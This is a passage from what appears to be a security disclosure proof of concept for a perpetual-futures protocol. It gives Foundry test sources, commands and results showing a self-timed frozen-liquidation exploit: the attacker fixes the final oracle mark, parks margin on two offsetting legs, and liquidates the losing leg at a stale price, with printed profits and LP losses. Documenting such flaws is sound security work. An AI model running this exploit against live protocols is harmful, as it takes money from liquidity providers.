    /// @dev Uses the production V3 commitment selector, bypassing the harness's historical scalar adapter.
    function _orderRequest(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(block.timestamp + router.maxExecutionWindowSeconds());
        request.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
    }

    function _openLeg(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        OrderV3Types.OrderRequest memory request = _orderRequest(side, size, margin, false);
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        uint64 c = uint64(vm.getBlockTimestamp());
        _go(c + 1);
        bytes[] memory px = _tick(1e8, c + 1, c); // built before the prank (setAllPrices is a call)
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, px);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed");
    }

    function _closeLeg(
        address account,
        CfdTypes.Side side,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request = _orderRequest(side, LEG, 0, true);
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        uint64 cc = uint64(vm.getBlockTimestamp());
        _go(cc + 1);
        bytes[] memory px = _tick(price, cc + 1, cc); // built before the prank (setAllPrices is a call)
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, px);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close executed");
    }

    /// @dev Frozen liquidation price for `side` (mark +/- 10 bp basket confidence x 25% adverse multiplier).
    function _liqPrice(
        CfdTypes.Side side
    ) internal view returns (uint256) {
        uint256 mark = engine.lastMarkPrice();
        uint256 shift = (mark * 10 / 10_000) * 2500 / 10_000;
        return side == CfdTypes.Side.LONG ? mark + shift : mark - shift;
    }

    function _req(
        address account,
        uint256 price
    ) internal view returns (uint256) {
        (uint256 size,,,,,,) = engine.positions(account);
        return (size / 1e20) * price * 300 / 10_000;
    }

    function _liquidatable(
        address account,
        CfdTypes.Side side
    ) internal view returns (bool) {
        return engineLens.isLiquidatableAt(account, _liqPrice(side), pool.totalAssets());
    }

    /// @dev Live FAD-lead liquidation check (MockPyth live ticks carry zero confidence in this harness).
    function _liveLiquidatable(
        address account,
        uint256 price
    ) internal view returns (bool) {
        return engineLens.isLiquidatableAt(account, price, pool.totalAssets());
    }

    /// @dev Attacker keep-alive during the live FAD lead: top up to live boundary + CUSHION if below it.
    function _keepAliveLive(
        address account,
        uint256 price
    ) internal {
        int256 equity = engineLens.previewLiquidation(account, price).equityAssets;
        int256 target = int256(_req(account, price) + CUSHION);
        if (equity < target) {
            vm.prank(account);
            engine.addMargin(account, uint256(target - equity));
        }
    }

    /// @dev Carry an account will pay between `fromTs` and `toTs` at the frozen liquidation price (state snapshot).
    function _carryBetween(
        address account,
        CfdTypes.Side side,
        uint256 fromTs,
        uint256 toTs
    ) internal returns (uint256) {
        uint256 nowTs = vm.getBlockTimestamp();
        uint256 nowBlock = vm.getBlockNumber();
        uint256 snap = vm.snapshotState();
        vm.warp(fromTs);
        int256 e0 = engineLens.previewLiquidation(account, _liqPrice(side)).equityAssets;
        vm.warp(toTs);
        int256 e1 = engineLens.previewLiquidation(account, _liqPrice(side)).equityAssets;
        vm.revertToState(snap);
        vm.warp(nowTs);
        vm.roll(nowBlock);
        return e0 > e1 ? uint256(e0 - e1) : 0;
    }

    function _log(
        string memory tag,
        Outcome memory o
    ) internal pure {
        console2.log(tag);
        console2.log("    loser exit cost (USDG atoms)       ", o.loserExitCost);
        console2.log("    loser exit cost (bp of 4M notional)", o.loserExitCost * 10_000 / 4_000_000e6);
        if (o.minutesToCross != 0) {
            console2.log("    minutes after decision to frozen exit", o.minutesToCross);
        }
        console2.log("    attacker net (USDG atoms, signed)  ", o.attackerNet);
        console2.log("    LP net (pool assets, signed)       ", o.lpNet);
        console2.log("    protocol treasury net (signed)     ", o.treasuryNet);
        console2.log("    independent keeper net (signed)    ", o.keeperNet);
    }

}
```

## Noon reopen-gap sensitivity

```sh
NO_COLOR=1 forge test --root packages/perps --match-path test/poc/TimedLiquidationGapSensitivity.t.sol --match-test test_SelfTimedLiquidationAcrossReopenGaps -vv
```

Run 1, selected output:

```text
[PASS] test_SelfTimedLiquidationAcrossReopenGaps() (gas: 385748565)
  gap bp 20
    ATTACK    attacker net (USDG) -997
    VOLUNTARY attacker net (USDG) -27595
  gap bp 25
    ATTACK    attacker net (USDG) 1001
    VOLUNTARY attacker net (USDG) -25596
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 459.90ms (453.73ms CPU time)
```

Run 2, same command, matching scenario lines:

```text
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 406.90ms (401.62ms CPU time)
```

### `TimedLiquidationGapSensitivity.t.sol` — complete source

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {TimedFrozenLiquidationExitTest} from "./TimedFrozenLiquidationExit.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Same scenario as TimedFrozenLiquidationExitTest (release parameters, 4M legs, 10M Junior pool, one-tx park in the
///         last live second, carry-only crossing, self-keeper frozen liquidation), but the Sunday reopen gap is a
///         parameter. Prints trader and LP results for the liquidation and both controls at each gap, allowing
///         comparison of the two exit paths as the reopen gap changes.
contract TimedLiquidationGapSensitivityTest is TimedFrozenLiquidationExitTest {

    function _runGap(
        uint8 mode,
        bool gapUp,
        uint256 gap
    ) internal returns (Outcome memory o) {
        (uint256 poolBefore, uint256 treasuryBefore, uint256 keeperBefore,) = _setupThroughFinalPark(false);

        _go(DECISION);
        assertFalse(_liquidatable(address(legA), CfdTypes.Side.LONG), "A healthy at decision");
        assertFalse(_liquidatable(address(legB), CfdTypes.Side.SHORT), "B healthy at decision");
        address loser = gapUp ? address(legA) : address(legB);
        address winner = gapUp ? address(legB) : address(legA);
        CfdTypes.Side loserSide = gapUp ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT;
        CfdTypes.Side winnerSide = gapUp ? CfdTypes.Side.SHORT : CfdTypes.Side.LONG;
        vm.prank(winner);
        engine.addMargin(winner, 40_000e6);
        uint256 loserBefore = clearinghouse.balanceAssets(loser);

        if (mode == MODE_ATTACK) {
            uint256 t = DECISION;
            while (!_liquidatable(loser, loserSide)) {
                t += 30 minutes;
                require(t < REOPEN, "loser did not cross before reopen");
                _go(t);
            }
            o.minutesToCross = (t - DECISION) / 60;
            int256 equity = engineLens.previewLiquidation(loser, _liqPrice(loserSide)).equityAssets;
            uint256 charge = engineLens.previewLiquidation(loser, _liqPrice(loserSide)).liquidationChargeAssets;
            assertGt(equity, int256(charge), "positive liquidation residual");
            vm.prank(SELF_KEEPER);
            router.executeLiquidation(loser, new bytes[](0));
            (uint256 sl,,,,,,) = engine.positions(loser);
            assertEq(sl, 0, "loser liquidated at the stale mark");
        } else if (mode == MODE_VOLUNTARY) {
            _go(DECISION + 30 minutes); // compare the same frozen exit minute as liquidation
            o.minutesToCross = 30;
            assertTrue(_liquidatable(loser, loserSide), "control: same eligibility time");
            OrderV3Types.OrderRequest memory request = _orderRequest(loserSide, LEG, 0, true);
            vm.prank(loser);
            uint64 id = router.commitOrder(request);
            uint64 cc = uint64(vm.getBlockTimestamp());
            _go(cc + 1);
            bytes[] memory px = _tick(FINAL_PRICE, cc + 1, cc);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory r = router.executeOrder(id, px);
            assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "frozen close executed");
        } else {
            vm.prank(loser);
            engine.addMargin(loser, 40_000e6);
        }
        if (mode != MODE_HOLD) {
            o.loserExitCost = loserBefore - clearinghouse.balanceAssets(loser);
        }

        _go(REOPEN + 5);
        uint256 gapPrice = gapUp ? FINAL_PRICE * (10_000 + gap) / 10_000 : FINAL_PRICE * (10_000 - gap) / 10_000;
        _refresh(gapPrice);
        _closeLeg(winner, winnerSide, gapPrice);
        if (mode == MODE_HOLD) {
            _closeLeg(loser, loserSide, gapPrice);
        }

        uint256 attackerFinal = clearinghouse.balanceAssets(address(legA)) + clearinghouse.balanceAssets(address(legB))
            + engine.traderClaimBalanceAssets(address(legA)) + engine.traderClaimBalanceAssets(address(legB))
            + clearinghouse.balanceAssets(SELF_KEEPER);
        o.attackerNet = int256(attackerFinal) - int256(2 * FUND);
        o.lpNet = int256(pool.totalAssets()) - int256(poolBefore);
        o.treasuryNet = int256(clearinghouse.balanceAssets(engine.protocolTreasury())) - int256(treasuryBefore);
        o.keeperNet = int256(clearinghouse.balanceAssets(KEEPER)) - int256(keeperBefore);
        assertEq(o.attackerNet + o.lpNet + o.treasuryNet + o.keeperNet, 0, "conservation");
    }

    function test_SelfTimedLiquidationAcrossReopenGaps() public {
        uint16[9] memory gaps = [uint16(0), 10, 20, 25, 30, 38, 51, 75, 93];
        console2.log("Reopen-gap sweep, 4M legs, 10M Junior pool, gap up (loser = LONG A); USDG, signed");
        for (uint256 i; i < gaps.length; ++i) {
            uint256 s = vm.snapshotState();
            Outcome memory a = _runGap(MODE_ATTACK, true, gaps[i]);
            vm.revertToState(s);
            Outcome memory v = _runGap(MODE_VOLUNTARY, true, gaps[i]);
            vm.revertToState(s);
            Outcome memory h = _runGap(MODE_HOLD, true, gaps[i]);
            vm.revertToState(s);
            console2.log("gap bp", uint256(gaps[i]));
            console2.log("  ATTACK    attacker net (USDG)", a.attackerNet / 1e6);
            console2.log("  ATTACK    LP net (USDG)      ", a.lpNet / 1e6);
            console2.log("  VOLUNTARY attacker net (USDG)", v.attackerNet / 1e6);
            console2.log("  VOLUNTARY LP net (USDG)      ", v.lpNet / 1e6);
            console2.log("  HOLD      attacker net (USDG)", h.attackerNet / 1e6);
            console2.log("  HOLD      LP net (USDG)      ", h.lpNet / 1e6);
            assertGt(a.attackerNet, v.attackerNet, "liquidation branch exceeds voluntary close branch");
            assertLt(a.lpNet, v.lpNet, "LPs receive less on the liquidation branch");
        }
    }

}
```

## One-hour decision: 25 bp and independent-keeper 50 bp

```sh
NO_COLOR=1 forge test --root packages/perps --match-path test/poc/LateDecisionFrozenExit.t.sol -vv
```

Run 1, selected output:

```text
[PASS] test_CompareBothDirections() (gas: 87921131)
  === reopen gap UP 25 bp: loser = LONG A
  ATTACK self-timed frozen liquidation (own keeper)
      attacker net (USDG atoms, signed)   931832299
  === reopen gap DOWN 25 bp: loser = SHORT B
  ATTACK self-timed frozen liquidation (own keeper)
      attacker net (USDG atoms, signed)   940773474
[PASS] test_FinalMarkIsFixedByAttackerTx() (gas: 10820342)
[PASS] test_GapDown_ExitShortBySelfTimedLiquidation() (gas: 13980494)
[PASS] test_GapUp_ExitLongBySelfTimedLiquidation() (gas: 13978336)
[PASS] test_LateFiftyBpIndependentKeeperBothDirections() (gas: 87876600)
  === late 50 bp UP, independent liquidator
  ATTACK independent liquidator takes bounty
      attacker net (USDG atoms, signed)   8928072203
      LP net (pool assets, signed)        -15736704363
      independent keeper net (signed)     2000600000
  CONTROL voluntary frozen close
      attacker net (USDG atoms, signed)   -15670068819
  CONTROL hold both through reopen
      attacker net (USDG atoms, signed)   -15761983009
  === late 50 bp DOWN, independent liquidator
  ATTACK independent liquidator takes bounty
      attacker net (USDG atoms, signed)   8945393538
      LP net (pool assets, signed)        -15737165698
      independent keeper net (signed)     2000140000
  CONTROL voluntary frozen close
      attacker net (USDG atoms, signed)   -15653666386
  CONTROL hold both through reopen
      attacker net (USDG atoms, signed)   -15570427786
Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 102.06ms (234.84ms CPU time)
```

Run 2, same command, matching scenario lines:

```text
Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 103.05ms (250.73ms CPU time)
```

### `LateDecisionFrozenExit.t.sol` — complete source

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Minimal smart-account trader leg (any AA/contract wallet). The owner is the attacker; the operator is the
///         attacker's own parking contract, so both legs can be topped up inside one transaction.
contract ParkedLeg {

    address public immutable owner;
    address public operator;

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    function setOperator(
        address operator_
    ) external {
        require(msg.sender == owner, "owner");
        operator = operator_;
    }

    function exec(
        address target,
        bytes calldata data
    ) external returns (bytes memory ret) {
        require(msg.sender == owner || msg.sender == operator, "auth");
        bool ok;
        (ok, ret) = target.call(data);
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(ret, 32), mload(ret))
            }
        }
    }

}

interface IMarkRouter {

    function updateMarkPrice(
        bytes[] calldata pythUpdateData
    ) external payable;

}

/// @notice Attacker contract. In ONE transaction during the last live second it (1) pushes the final pre-freeze
///         basket as an ordinary permissionless keeper, with publishTime == block.timestamp, so no later live mark can
///         exist, and (2) reads that final mark on-chain and tops each leg up to the FROZEN FAD boundary (mark +/- the
///         synthesized frozen confidence shift, 3% margin) plus `keep[i]` of carry headroom. addMargin can only add,
///         so a leg that already sits above the target is left untouched and the amount is reported as zero.
contract Parker {

    function pushAndPark(
        address router,
        PletherOracle oracle,
        CfdEngine engine,
        CfdEngineLens lens,
        bytes[] calldata update,
        ParkedLeg[] calldata legs,
        uint256[] calldata keep,
        uint256 fadBps
    ) external returns (uint256[] memory added) {
        IMarkRouter(router).updateMarkPrice(update);
        uint256 mark = engine.lastMarkPrice();
        uint256 shift =
            ((mark * oracle.basketMaxConfidenceRatioBps()) / 10_000) * oracle.adverseConfidenceMultiplierBps() / 10_000;
        added = new uint256[](legs.length);
        for (uint256 i; i < legs.length; ++i) {
            address acct = address(legs[i]);
            (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(acct);
            uint256 liq = side == CfdTypes.Side.LONG ? mark + shift : mark - shift;
            int256 equity = lens.previewLiquidation(acct, liq).equityAssets;
            int256 target = int256((size / 1e20) * liq * fadBps / 10_000 + keep[i] + 1);
            if (equity < target) {
                added[i] = uint256(target - equity);
                legs[i].exec(address(engine), abi.encodeCall(CfdEngine.addMargin, (acct, added[i])));
            }
        }
    }

}

/// @notice Self-timed frozen liquidation bypasses the frozen-close spread: atomic parking, both directions.
///         Covers three timing and direction constraints:
///         (1) final-mark jitter: the attacker itself pushes the last live mark with publishTime == block.timestamp in
///             the last live second and parks both legs in the same transaction; the test proves no other keeper can
///             replace that mark (same-second replacement and future publish times revert; post-freeze updates are
///             ignored).
///         (2) FAD-lead price drift: the basket moves during the 30-minute FAD lead and the attacker only tops up the
///             losing leg; the drift-induced excess is absorbed because the frozen liquidation price is 2.5 bp more
///             adverse than the live one, so both legs can still be parked exactly.
///         (3) "only one leg works": the weekend switch is exercised in BOTH directions (exit LONG on a gap up, exit
///             SHORT on a gap down) with the same parking.
///         Larger legs (4M per side on a 10M Junior pool, opened in two steps to respect the 40% skew cap) also raise
///         utilization, i.e. carry speed, and enlarge the bypassed spread/fee/VPI.
contract LateDecisionFrozenExitTest is BasePerpTest {

    address internal constant KEEPER = address(0x4EE9E7); // independent keeper
    address internal constant OTHER_KEEPER = address(0x0BAD5EED); // competing keeper trying to move the final mark
    address internal constant SELF_KEEPER = address(0x5E1F); // attacker-owned keeper EOA
    address internal liquidator = SELF_KEEPER;

    // Friday 2024-10-18 20:29:59 UTC = 16:29:59 EDT (one second before FAD). Same anchor as OracleRegimeMatrix.
    uint256 internal constant BEFORE_FAD = 1_729_283_399;
    uint256 internal constant FREEZE = BEFORE_FAD + 1801; // 21:00:00 UTC = 17:00 EDT
    uint256 internal constant LAST_SECOND = FREEZE - 1; // 20:59:59 UTC, last live second
    uint256 internal constant DECISION = FREEZE + 47 hours; // Sunday 20:00 UTC, one hour before reopen
    uint256 internal constant REOPEN = FREEZE + 2 days; // Sunday 21:00 UTC = 17:00 EDT

    uint256 internal constant LEG = 4_000_000e18;
    uint256 internal constant HALF = 2_000_000e18;
    uint256 internal constant FUND = 300_000e6;
    uint256 internal constant CUSHION = 300e6; // live keep-alive cushion during the FAD lead (0.75 bp of 4M)
    uint256 internal constant FINAL_PRICE = 100_002_000; // final pre-freeze basket 1.00002
    uint256 internal gapBps = 25; // Sunday reopen gap, default 0.25%

    uint8 internal constant MODE_ATTACK = 0;
    uint8 internal constant MODE_VOLUNTARY = 1;
    uint8 internal constant MODE_HOLD = 2;

    ParkedLeg internal legA; // LONG
    ParkedLeg internal legB; // SHORT
    Parker internal parker;

    struct Outcome {
        uint256 loserExitCost;
        int256 attackerNet;
        int256 lpNet;
        int256 treasuryNet;
        int256 keeperNet;
        uint256 minutesToCross;
        uint256 parkedA;
        uint256 parkedB;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // packages/perps/DEPLOYMENT.md "Initial release parameters".
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.basketMaxConfidenceRatioBps = 10;
        cfg.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(cfg);
        legA = new ParkedLeg(address(this));
        legB = new ParkedLeg(address(this));
        parker = new Parker();
        legA.setOperator(address(parker));
        legB.setOperator(address(parker));
    }

    // ------------------------------------------------------------------ tests

    /// @notice The attacker-pushed last-second mark cannot be replaced by anyone.
    function test_FinalMarkIsFixedByAttackerTx() public {
        _setupThroughFinalPark(true);
        assertEq(engine.lastMarkTime(), LAST_SECOND, "attacker mark time");
        assertEq(engine.lastMarkPrice(), FINAL_PRICE, "attacker mark price");
    }

    function test_GapUp_ExitLongBySelfTimedLiquidation() public {
        Outcome memory o = _run(MODE_ATTACK, true);
        _log("ATTACK gap UP (exit LONG A by self-timed frozen liquidation)", o);
        assertGt(o.attackerNet, 0);
    }

    function test_GapDown_ExitShortBySelfTimedLiquidation() public {
        Outcome memory o = _run(MODE_ATTACK, false);
        _log("ATTACK gap DOWN (exit SHORT B by self-timed frozen liquidation)", o);
        assertGt(o.attackerNet, 0);
    }

    function test_CompareBothDirections() public {
        for (uint256 d; d < 2; ++d) {
            bool up = d == 0;
            uint256 s = vm.snapshotState();
            Outcome memory attack = _run(MODE_ATTACK, up);
            vm.revertToState(s);
            Outcome memory vol = _run(MODE_VOLUNTARY, up);
            vm.revertToState(s);
            Outcome memory hold = _run(MODE_HOLD, up);
            vm.revertToState(s);
            console2.log(up ? "=== reopen gap UP 25 bp: loser = LONG A" : "=== reopen gap DOWN 25 bp: loser = SHORT B");
            _log("ATTACK self-timed frozen liquidation (own keeper)", attack);
            _log("CONTROL voluntary frozen close", vol);
            _log("CONTROL hold both through reopen", hold);
            console2.log("  extra LP loss vs voluntary path (USDG atoms)", uint256(vol.lpNet - attack.lpNet));
            console2.log("  loser exit cost saved (USDG atoms)          ", vol.loserExitCost - attack.loserExitCost);
            assertGt(attack.attackerNet, 0, "liquidation branch profitable at 25 bp");
            assertLt(vol.attackerNet, 0, "voluntary close branch unprofitable at 25 bp");
            assertLt(hold.attackerNet, 0, "holding unprofitable");
            assertLt(attack.lpNet, vol.lpNet, "LPs lose more on the liquidation branch");
            assertLt(attack.lpNet, 0, "LPs lose on the liquidation branch");
        }
    }

    function test_LateFiftyBpIndependentKeeperBothDirections() public {
        gapBps = 50;
        liquidator = KEEPER;
        for (uint256 d; d < 2; ++d) {
            bool up = d == 0;
            uint256 s = vm.snapshotState();
            Outcome memory attack = _run(MODE_ATTACK, up);
            vm.revertToState(s);
            Outcome memory voluntary = _run(MODE_VOLUNTARY, up);
            vm.revertToState(s);
            Outcome memory hold = _run(MODE_HOLD, up);
            vm.revertToState(s);
            console2.log(up ? "=== late 50 bp UP, independent liquidator" : "=== late 50 bp DOWN, independent liquidator");
            _log("ATTACK independent liquidator takes bounty", attack);
            _log("CONTROL voluntary frozen close", voluntary);
            _log("CONTROL hold both through reopen", hold);
            assertGt(attack.attackerNet, 0, "profitable without liquidation bounty");
            assertLt(attack.lpNet, 0, "LP assets fall");
            assertLt(voluntary.attackerNet, 0, "voluntary close loses");
            assertLt(hold.attackerNet, 0, "holding both loses");
        }
    }

    // ------------------------------------------------------------------ scenario

    /// @dev Opens the straddle, runs a drifting FAD lead with keep-alive top-ups, and executes the attacker's
    ///      one-transaction push-and-park in the last live second. Returns pool/treasury/keeper baselines.
    function _setupThroughFinalPark(
        bool proveFinality
    ) internal returns (uint256 poolBefore, uint256 treasuryBefore, uint256 keeperBefore, uint256[] memory added) {
        // Thursday: fund and open 4M LONG (A) and 4M SHORT (B); A is opened in two halves to respect the 40% skew cap.
        _go(BEFORE_FAD - 1 days);
        _refresh(1e8);
        _fundTrader(address(legA), FUND);
        _fundTrader(address(legB), FUND);
        poolBefore = pool.totalAssets();
        treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        keeperBefore = clearinghouse.balanceAssets(KEEPER);
        _openLeg(address(legA), CfdTypes.Side.LONG, HALF, 10_000e6);
        _openLeg(address(legB), CfdTypes.Side.SHORT, LEG, 20_000e6);
        _openLeg(address(legA), CfdTypes.Side.LONG, HALF, 10_000e6);
        (uint256 sa,,,,,,) = engine.positions(address(legA));
        (uint256 sb,,,,,,) = engine.positions(address(legB));
        assertEq(sa, LEG, "A open");
        assertEq(sb, LEG, "B open");

        // FAD lead (live prices, 3% margin). The basket drifts; after each tick the attacker re-tops the losing leg to
        // the LIVE boundary + cushion. Neither leg is ever liquidatable, so third-party keepers cannot act.
        uint256[4] memory path = [uint256(1e8), 100_006_000, 99_996_000, 100_001_000];
        for (uint256 i; i < path.length; ++i) {
            _go(BEFORE_FAD + i * 540);
            _refresh(path[i]);
            assertFalse(_liveLiquidatable(address(legA), path[i]), "A safe in lead");
            assertFalse(_liveLiquidatable(address(legB), path[i]), "B safe in lead");
            _keepAliveLive(address(legA), path[i]);
            _keepAliveLive(address(legB), path[i]);
        }

        // Last live second: the attacker's single transaction pushes the final basket and parks both legs on the
        // frozen boundary with carry headroom until the decision time (headroom computed off-chain beforehand).
        _go(LAST_SECOND);
        uint256[] memory keep = new uint256[](2);
        keep[0] = _carryBetween(address(legA), CfdTypes.Side.LONG, LAST_SECOND, DECISION);
        keep[1] = _carryBetween(address(legB), CfdTypes.Side.SHORT, LAST_SECOND, DECISION);
        ParkedLeg[] memory legs = new ParkedLeg[](2);
        legs[0] = legA;
        legs[1] = legB;
        bytes[] memory fin = _tick(FINAL_PRICE, uint64(LAST_SECOND), uint64(LAST_SECOND - 1));
        added = parker.pushAndPark(address(router), pletherOracle, engine, engineLens, fin, legs, keep, 300);
        console2.log("  carry headroom to decision A / B (USDG atoms)", keep[0], keep[1]);
        console2.log("  one-tx park top-up A / B (USDG atoms)       ", added[0], added[1]);
        assertGt(added[0], 0, "A needed a top-up: lead excess absorbed by the frozen shift");
        assertGt(added[1], 0, "B needed a top-up: lead excess absorbed by the frozen shift");

        if (proveFinality) {
            // Same second: a competing keeper cannot replace the final mark with a different price ...
            vm.prank(OTHER_KEEPER);
            vm.expectRevert();
            router.updateMarkPrice(_payload(FINAL_PRICE - 3000, uint64(LAST_SECOND), uint64(LAST_SECOND - 1)));
            // ... and cannot use a newer publish time while block.timestamp is still the last live second.
            vm.prank(OTHER_KEEPER);
            vm.expectRevert();
            router.updateMarkPrice(_payload(FINAL_PRICE - 3000, uint64(FREEZE), uint64(LAST_SECOND)));
            // After 17:00:00 New York the oracle is frozen: any update is ignored (or rejected); the mark is final.
            _go(FREEZE + 1);
            vm.prank(OTHER_KEEPER);
            try router.updateMarkPrice(_payload(FINAL_PRICE - 3000, uint64(FREEZE + 1), uint64(FREEZE))) {} catch {}
            assertEq(engine.lastMarkPrice(), FINAL_PRICE, "frozen mark unchanged");
            assertEq(engine.lastMarkTime(), LAST_SECOND, "frozen mark time unchanged");
            console2.log("  final mark fixed by attacker tx; competing keeper updates rejected/ignored");
        }
    }

    function _run(
        uint8 mode,
        bool gapUp
    ) internal returns (Outcome memory o) {
        (uint256 poolBefore, uint256 treasuryBefore, uint256 keeperBefore, uint256[] memory added) =
            _setupThroughFinalPark(false);
        o.parkedA = added[0];
        o.parkedB = added[1];

        // Freeze: neither leg is liquidatable (third-party keepers cannot act) and the switch budget is measured.
        _go(FREEZE + 10);
        assertTrue(engine.isOracleFrozen() && engine.isFadWindow(), "frozen");
        assertFalse(_liquidatable(address(legA), CfdTypes.Side.LONG), "A healthy at freeze");
        assertFalse(_liquidatable(address(legB), CfdTypes.Side.SHORT), "B healthy at freeze");
        uint256 budgetA = _carryBetween(address(legA), CfdTypes.Side.LONG, FREEZE + 10, REOPEN - 1);
        console2.log("  switch budget A: carry freeze->reopen (USDG atoms; in 0.01 bp of 4M)", budgetA, budgetA / 4_000_000);

        // Decision time: weekend information says which way the reopen gaps.
        _go(DECISION);
        assertFalse(_liquidatable(address(legA), CfdTypes.Side.LONG), "A healthy at decision");
        assertFalse(_liquidatable(address(legB), CfdTypes.Side.SHORT), "B healthy at decision");
        address loser = gapUp ? address(legA) : address(legB);
        address winner = gapUp ? address(legB) : address(legA);
        CfdTypes.Side loserSide = gapUp ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT;
        CfdTypes.Side winnerSide = gapUp ? CfdTypes.Side.SHORT : CfdTypes.Side.LONG;
        vm.prank(winner);
        engine.addMargin(winner, 40_000e6); // keep the winner alive through the reopen
        uint256 loserBefore = clearinghouse.balanceAssets(loser);

        if (mode == MODE_ATTACK) {
            uint256 t = DECISION;
            while (!_liquidatable(loser, loserSide)) {
                t += 30 minutes;
                require(t < REOPEN, "loser did not cross before reopen");
                _go(t);
            }
            o.minutesToCross = (t - DECISION) / 60;
            int256 equity = engineLens.previewLiquidation(loser, _liqPrice(loserSide)).equityAssets;
            uint256 charge = engineLens.previewLiquidation(loser, _liqPrice(loserSide)).liquidationChargeAssets;
            assertGt(equity, int256(charge), "positive liquidation residual");
            vm.prank(liquidator);
            router.executeLiquidation(loser, new bytes[](0)); // frozen: stale mark + 2.5 bp shift
            (uint256 sl,,,,,,) = engine.positions(loser);
            assertEq(sl, 0, "loser liquidated at the stale mark");
        } else if (mode == MODE_VOLUNTARY) {
            _go(DECISION + 30 minutes); // compare the same frozen exit minute as liquidation
            o.minutesToCross = 30;
            assertTrue(_liquidatable(loser, loserSide), "control: same eligibility time");
            OrderV3Types.OrderRequest memory request = _orderRequest(loserSide, LEG, 0, true);
            vm.prank(loser);
            uint64 id = router.commitOrder(request);
            uint64 cc = uint64(vm.getBlockTimestamp());
            _go(cc + 1);
            bytes[] memory px = _tick(FINAL_PRICE, cc + 1, cc); // built before the prank (setAllPrices is a call)
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory r = router.executeOrder(id, px);
            assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "frozen close executed");
            (uint256 sl,,,,,,) = engine.positions(loser);
            assertEq(sl, 0, "loser closed at stale mark + spread");
        } else {
            vm.prank(loser);
            engine.addMargin(loser, 40_000e6);
        }
        if (mode != MODE_HOLD) {
            o.loserExitCost = loserBefore - clearinghouse.balanceAssets(loser);
        }

        // Sunday reopen: first live tick carries the gap; the surviving leg(s) close through the Router.
        _go(REOPEN + 5);
        assertFalse(engine.isOracleFrozen(), "live again");
        uint256 gapPrice =
            gapUp ? FINAL_PRICE * (10_000 + gapBps) / 10_000 : FINAL_PRICE * (10_000 - gapBps) / 10_000;
        _refresh(gapPrice);
        _closeLeg(winner, winnerSide, gapPrice);
        if (mode == MODE_HOLD) {
            _closeLeg(loser, loserSide, gapPrice);
        }

        uint256 attackerFinal = clearinghouse.balanceAssets(address(legA)) + clearinghouse.balanceAssets(address(legB))
            + engine.traderClaimBalanceAssets(address(legA)) + engine.traderClaimBalanceAssets(address(legB))
            + clearinghouse.balanceAssets(SELF_KEEPER);
        o.attackerNet = int256(attackerFinal) - int256(2 * FUND);
        o.lpNet = int256(pool.totalAssets()) - int256(poolBefore);
        o.treasuryNet = int256(clearinghouse.balanceAssets(engine.protocolTreasury())) - int256(treasuryBefore);
